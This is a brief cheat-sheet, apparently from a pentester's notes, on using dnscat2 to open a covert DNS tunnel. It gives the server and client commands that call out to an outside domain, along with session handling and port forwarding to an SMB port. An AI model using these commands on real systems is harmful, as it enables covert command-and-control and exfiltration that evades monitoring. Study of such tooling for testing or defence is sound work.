# dnscat

DNS cat is a tool to create DNS tunnels. It is stealthy if traffic analysis is set up, but requires client to be uploaded on target - so it can be not so stealthy on disk



Run server:

```bash
dnscat2-server ice.club
```

Run client:

```
./dnscat ice.club
```

Interact with window:

```
windows
window -i 1
```

Forward one port:

```
listen 127.0.0.1:4455 1.1.1.1:445
```
